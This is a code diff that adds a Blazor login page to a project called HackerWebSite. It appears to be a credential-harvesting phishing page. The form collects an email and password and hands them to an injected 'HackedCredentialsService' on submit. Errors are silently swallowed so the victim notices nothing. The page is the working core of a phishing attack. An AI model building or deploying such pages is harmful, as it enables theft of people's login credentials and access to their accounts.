@@ -1,0 +1,39 @@
+﻿@page "/Login"
+
+@using HackerWebSite.Data
+@inject HackedCredentialsService HackedCredentialsService
+
+<h3>Login</h3>
+<EditForm Model=@loginDTO OnValidSubmit=@HandleValidSubmit>
+    <div class="form-group">
+        <label for="Email">Email Address</label>
+        <InputText id="Email" class="form-control" @bind-Value="loginDTO.Email" />
+    </div>
+
+    <div class="form-group">
+        <label for="Password">Message</label>
+        <InputText type="password" id="Password" class="form-control" @bind-Value="loginDTO.Password" />
+    </div>
+    <button class="btn btn-primary" type="submit">Submit</button>
+</EditForm>
+
+@code {
+    private LoginDTO loginDTO = new LoginDTO();
+
+
+   // protected async override void OnInitializedAsync()
+   // {
+     //   await HackedCredentialsService.PostLoginAsync(loginDTO.Email, loginDTO.Password);
+    //}
+
+    private async void HandleValidSubmit()
+    {
+        try
+        {
+            await HackedCredentialsService.PostLoginAsync(loginDTO.Email, loginDTO.Password);
+        }
+        catch
+        {
+        }
+    }
+}
